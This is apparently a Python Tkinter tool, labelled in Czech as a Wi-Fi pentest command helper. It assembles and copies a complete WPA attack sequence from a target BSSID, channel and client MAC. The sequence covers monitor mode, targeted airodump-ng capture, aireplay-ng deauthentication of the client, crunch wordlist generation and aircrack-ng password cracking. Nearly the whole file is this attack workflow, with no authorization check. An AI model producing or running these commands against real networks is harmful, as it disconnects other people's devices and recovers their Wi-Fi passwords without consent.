import tkinter as tk
from tkinter import ttk, messagebox
import subprocess
import os

APP_TITLE = "Wi-Fi Pentest Command Helper (Tkinter)"
APP_WIDTH = 900
APP_HEIGHT = 800


BG_COLOR = "#000000"
FG_COLOR = "#00FF00"
FONT = ("Courier New", 10)

class ScrollableFrame(ttk.Frame):
    def __init__(self, parent, *args, **kwargs):
        super().__init__(parent, *args, **kwargs)
        self.canvas = tk.Canvas(self, borderwidth=0, highlightthickness=0, bg=BG_COLOR)
        self.vscroll = ttk.Scrollbar(self, orient="vertical", command=self.canvas.yview)
        self.canvas.configure(yscrollcommand=self.vscroll.set)
        self.inner = ttk.Frame(self.canvas)
        self.inner.bind("<Configure>",
                        lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all")))
        self.window = self.canvas.create_window((0, 0), window=self.inner, anchor="nw")
        self.canvas.pack(side="left", fill="both", expand=True)
        self.vscroll.pack(side="right", fill="y")
        self.canvas.bind_all("<MouseWheel>", self._on_mousewheel)
        self.canvas.bind_all("<Button-4>", self._on_mousewheel_linux)
        self.canvas.bind_all("<Button-5>", self._on_mousewheel_linux)
        self.bind("<Configure>", self._on_frame_resize)

    def _on_mousewheel(self, event):
        self.canvas.yview_scroll(int(-1*(event.delta/120)), "units")

    def _on_mousewheel_linux(self, event):
        if event.num == 4:
            self.canvas.yview_scroll(-3, "units")
        elif event.num == 5:
            self.canvas.yview_scroll(3, "units")

    def _on_frame_resize(self, event):
        self.canvas.itemconfig(self.window, width=event.width)

def build_commands(values):
    iface = values["iface"].get().strip() or "wlan0"
    bssid = values["bssid"].get().strip()
    channel = values["channel"].get().strip()
    client = values["client"].get().strip()
    capbase = values["capbase"].get().strip() or "wpa_handshake"
    wordlist = values["wordlist"].get().strip() or "/usr/share/wordlists/rockyou.txt"
    crunch_min = values["crunch_min"].get().strip() or "8"
    crunch_max = values["crunch_max"].get().strip() or "8"
    crunch_charset = values["crunch_charset"].get().strip() or "abcdef123456"
    
    cmds = {}
    cmds["root"] = "sudo su"
    cmds["monitor_mode"] = "\n".join([f"ifconfig {iface} down",
                                     "airmon-ng check kill",
                                     f"iwconfig {iface} mode monitor",
                                     f"ifconfig {iface} up",
                                     "iwconfig"])
    cmds["airodump_all"] = f"airodump-ng {iface}"
    
    targeted_parts = ["airodump-ng"]
    if bssid:
        targeted_parts += ["--bssid", bssid]
    if channel:
        targeted_parts += ["--channel", channel]
    targeted_parts += ["--write", capbase, iface]
    cmds["airodump_targeted"] = " ".join(targeted_parts)
    
    deauth_parts = ["aireplay-ng", "--deauth", "4"]
    if bssid:
        deauth_parts += ["-a", bssid]
    if client:
        deauth_parts += ["-c", client]
    deauth_parts += [iface]
    cmds["deauth"] = " ".join(deauth_parts)
    
    cmds["crunch"] = f"crunch {crunch_min} {crunch_max} {crunch_charset} -o wordlist.txt"
    cmds["aircrack_with_path"] = f"aircrack-ng {capbase}-01.cap -w {wordlist}"
    cmds["aircrack_with_crunch"] = f"aircrack-ng {capbase}-01.cap -w wordlist.txt"
    cmds["back"] = "\n".join([f"ifconfig {iface} down",
                             f"iwconfig {iface} mode managed",
                             f"ifconfig {iface} up",
                             "service NetworkManager restart"])
    cmds["check_handshake"] = "\n".join(["# Základní kontrola, zda je handshake zachycen:",
                                        f"aircrack-ng -a2 -b {bssid or '<BSSID>'} {capbase}-01.cap",
                                        "",
                                        "# Pokud v hlavičce uvidíš [ WPA handshake: <BSSID> ], handshake je OK.",
                                        "# Alternativně můžeš použít tshark:",
                                        f"tshark -r {capbase}-01.cap -Y 'eapol'"])
    
    full = []
    order = [("root", "0) Root (sudo su)"),
             ("monitor_mode", "1) Monitor mód"),
             ("airodump_all", "2) Airodump – všechny sítě"),
             ("airodump_targeted", "3) Airodump – cílová síť"),
             ("deauth", "4) Deauth (aireplay-ng)"),
             ("crunch", "5) Wordlist (crunch)"),
             ("aircrack_with_path", "6a) Crack – zadaný wordlist"),
             ("aircrack_with_crunch", "6b) Crack – wordlist.txt z crunch"),
             ("back", "7) Návrat na běžné Wi-Fi"),
            ]
    
    for key, label in order:
        full.append(f"# --- {label} ---")
        full.append(cmds[key])
        full.append("")
    
    cmds["full_sequence"] = "\n".join(full)
    return cmds

def copy_to_clipboard(text):
    try:
        root.clipboard_clear()
        root.clipboard_append(text)
        status.set("Zkopírováno do schránky.")
    except Exception as e:
        messagebox.showerror("Chyba", f"Nepodařilo se kopírovat: {e}")



def make_section(frame, title, build_key, multiline=True):
    group = ttk.LabelFrame(frame, text=title, padding=(10, 8))
    group.pack(fill="x", padx=10, pady=6)
    
    txt_frame = ttk.Frame(group)
    txt_frame.pack(fill="x", padx=4, pady=4)
    
    txt = tk.Text(txt_frame, height=3 if not multiline else 6, wrap="word", 
                  bg=BG_COLOR, fg=FG_COLOR, font=FONT)
    txt.pack(side="left", fill="x", expand=True)
    
    txt_scroll = ttk.Scrollbar(txt_frame, orient="vertical", command=txt.yview)
    txt_scroll.pack(side="right", fill="y")
    txt.configure(yscrollcommand=txt_scroll.set)
    
    def refresh():
        cmds = build_commands(entries)
        txt.delete("1.0", "end")
        txt.insert("1.0", cmds[build_key])
    
    btns = ttk.Frame(group)
    btns.pack(fill="x", padx=4, pady=4)
    ttk.Button(btns, text="Aktualizovat", command=refresh).pack(side="left", padx=4)
    ttk.Button(btns, text="Kopírovat příkaz", 
               command=lambda: copy_to_clipboard(txt.get("1.0", "end").strip())).pack(side="left", padx=4)
    
    return txt

def rebuild_all():
    for r in rebuilders:
        r()

root = tk.Tk()
root.title(APP_TITLE)
root.geometry(f"{APP_WIDTH}x{APP_HEIGHT}")
root.minsize(720, 540)
root.configure(bg=BG_COLOR)

style = ttk.Style()
style.theme_use('clam')  
style.configure('.', background=BG_COLOR, foreground=FG_COLOR, fieldbackground=BG_COLOR)
style.configure('TFrame', background=BG_COLOR)
style.configure('TLabel', background=BG_COLOR, foreground=FG_COLOR)
style.configure('TButton', background=BG_COLOR, foreground=FG_COLOR)
style.configure('TLabelFrame', background=BG_COLOR, foreground=FG_COLOR)
style.configure('TEntry', fieldbackground=BG_COLOR, foreground=FG_COLOR)
style.configure('TScrollbar', background=BG_COLOR)

main = ttk.Frame(root, padding=10)
main.pack(fill="both", expand=True)

inputs = ttk.LabelFrame(main, text="Parametry", padding=(10, 8))
inputs.pack(fill="x", padx=6, pady=6)

entries = {}
def add_input(label, key, default=""):
    row = ttk.Frame(inputs)
    row.pack(fill="x", pady=2)
    ttk.Label(row, text=label, width=22).pack(side="left")
    var = tk.StringVar(value=default)
    ent = ttk.Entry(row, textvariable=var)
    ent.pack(side="left", fill="x", expand=True)
    entries[key] = var

add_input("Síťová karta (iface):", "iface", "wlan0")
add_input("BSSID (AP MAC):", "bssid", "")
add_input("Kanál (CH):", "channel", "")
add_input("Klient (STA MAC):", "client", "")
add_input("Název cap souboru:", "capbase", "wpa_handshake")
add_input("Wordlist (cesta):", "wordlist", "/usr/share/wordlists/rockyou.txt")
add_input("Crunch min délka:", "crunch_min", "8")
add_input("Crunch max délka:", "crunch_max", "8")
add_input("Crunch znaková sada:", "crunch_charset", "abcdef123456")

btn_row = ttk.Frame(inputs)
btn_row.pack(fill="x", pady=4)
status = tk.StringVar(value="Připraveno.")
ttk.Button(btn_row, text="Přegenerovat vše", command=lambda: rebuild_all()).pack(side="left", padx=4)

ttk.Label(btn_row, textvariable=status).pack(side="right")

sections_wrapper = ScrollableFrame(main)
sections_wrapper.pack(fill="both", expand=True, padx=4, pady=4)

rebuilders = []
def section_with_rebuilder(title, key, multiline=True):
    text_widget = make_section(sections_wrapper.inner, title, key, multiline=multiline)
    def rebuilder():
        cmds = build_commands(entries)
        text_widget.delete("1.0", "end")
        text_widget.insert("1.0", cmds[key])
    rebuilders.append(rebuilder)

section_with_rebuilder("0) Root (sudo su)", "root", multiline=False)
section_with_rebuilder("1) Monitor mód", "monitor_mode")
section_with_rebuilder("2) Airodump – všechny sítě", "airodump_all", multiline=False)
section_with_rebuilder("3) Airodump – cílová síť", "airodump_targeted")
section_with_rebuilder("4) Deauth (aireplay-ng)", "deauth", multiline=False)
section_with_rebuilder("5) Wordlist (crunch)", "crunch", multiline=False)
section_with_rebuilder("6a) Crack – zadaný wordlist", "aircrack_with_path", multiline=False)
section_with_rebuilder("6b) Crack – wordlist.txt z crunch", "aircrack_with_crunch", multiline=False)
section_with_rebuilder("7) Návrat na běžné Wi-Fi", "back")

rebuild_all()




root.mainloop()

